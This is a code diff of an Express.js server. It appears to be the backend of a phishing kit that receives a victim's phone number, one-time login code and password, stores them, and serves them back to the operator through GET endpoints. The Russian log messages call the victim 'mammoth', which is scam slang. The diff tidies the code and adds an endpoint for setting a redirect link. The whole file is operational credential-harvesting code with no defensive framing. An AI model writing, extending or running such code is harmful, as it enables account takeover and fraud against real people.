@@ -3,22 +3,7 @@ const app = express();
 const port = 3000;
 const cors = require('cors');
 
-// app.use((req, res, next) => {
-    //     res.header('Access-Control-Allow-Origin', '*');
-    //     res.header('Access-Control-Allow-Credentials', true);
-//     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-//     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-
-//     if (req.method === 'OPTIONS') {
-//       res.sendStatus(200);
-//     } else {
-//       next();
-//     }
-//   });
-
-
-app.use(express.json());
-
+// Настройка CORS
 app.use(cors({
     origin: '*',
     methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
@@ -27,9 +12,14 @@ app.use(cors({
     allowedHeaders: ['Content-Type', 'Authorization'],
 }));
 
-var pn;
-var code;
-var pass;
+app.use(express.json());
+
+let pn;
+let code;
+let pass;
+let redirectLink; // Новая переменная для хранения ссылки
+
+// Обработка номера телефона
 app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
     if (typeof phone_number !== 'undefined') {
@@ -47,37 +37,39 @@ app.post('/phone', (req, res) => {
 app.get('/getPhone', (req, res) => {
     if(pn){
         res.send(`Номер телефона мамонта: ${pn}`);
-        return 0;
+        return;
     } else {
         res.status(404).send('Номер телефона мамонта не найден.');
-        return 0;
+        return;
     }
 });
 
+// Обработка кода
 app.post('/authCode', (req, res) => {
     const value = req.body.value;
     if (typeof value !== 'undefined') {
         code = value;
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
-        return 0;
+        return;
     } else {
         console.log('Код мамонта неопределен.');
         res.status(400).json({ error: 'Код мамонта неопределен.' });
-        return 0;
+        return;
     }
 });
 
 app.get('/getCode', (req, res) => {
     if(code){
         res.send(`Код мамонта:\n${code}`);
-        return 0;
+        return;
     } else {
         res.status(404).send('Код мамонта не найден.');
-        return 0;
+        return;
     }
 });
 
+// Обработка пароля
 app.post('/password', (req, res) => {
     const password = req.body.passwordInput;
     if (typeof password !== 'undefined') {
@@ -102,6 +94,32 @@ app.get('/getPassword', (req, res) => {
     }
 });
 
+// Обработка ссылки
+app.post('/redirect-link', (req, res) => {
+    const { link } = req.body;
+    if (typeof link !== 'undefined') {
+        redirectLink = link;
+        console.log(`Ссылка установлена: ${link}`);
+        res.json({ message: `Ссылка установлена: ${link}` });
+        return;
+    } else {
+        console.log('Ссылка неопределена.');
+        res.status(400).json({ error: 'Ссылка неопределена.' });
+        return;
+    }
+});
+
+app.get('/redirect-link', (req, res) => {
+    if(redirectLink){
+        res.json({ link: redirectLink });
+        return;
+    } else {
+        res.status(404).send('Ссылка не найдена.');
+        return;
+    }
+});
+
+// Корневая страница
 app.get('/', (req, res) => {
     res.send('Salam Alejkum, Denis Penis!');
 });
